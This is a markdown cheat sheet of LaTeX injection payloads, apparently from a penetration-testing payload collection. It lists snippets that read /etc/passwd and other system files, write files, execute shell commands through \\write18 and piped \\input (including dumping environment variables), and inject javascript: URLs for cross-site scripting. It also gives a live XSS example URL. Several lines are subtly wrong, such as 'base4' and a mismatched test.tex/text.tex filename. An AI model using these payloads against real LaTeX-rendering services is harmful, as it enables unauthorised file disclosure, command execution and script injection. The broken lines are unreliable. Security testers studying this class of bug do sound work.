# LaTex Injection

## Read file

```bash
\input{/etc/passwd}
\include{password} # load .tex file
```

Read single lined file

```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

Read multiple lined file

```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Read text file, keep the formatting

```bash
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

## Write file

```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

## Command execution

The input of the command will be redirected to stdin, use a temp file to get it.

```bash
\immediate\write18{env > output}
\input{output}
```

If you get any LaTex error, consider using base64 to get the result without bad characters

```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```

## Cross Site Scripting

From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

Live example at `http://payontriage.com/xss.php?xss=$\href{javascript:alert(1)}{Frogs%20find%20bugs}$`

## References

* [Hacking with LaTeX - Sebastian Neef - 0day.work](https://0day.work/hacking-with-latex/)
* [Latex to RCE, Private Bug Bounty Program - Yasho](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [Pwning coworkers thanks to LaTeX](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)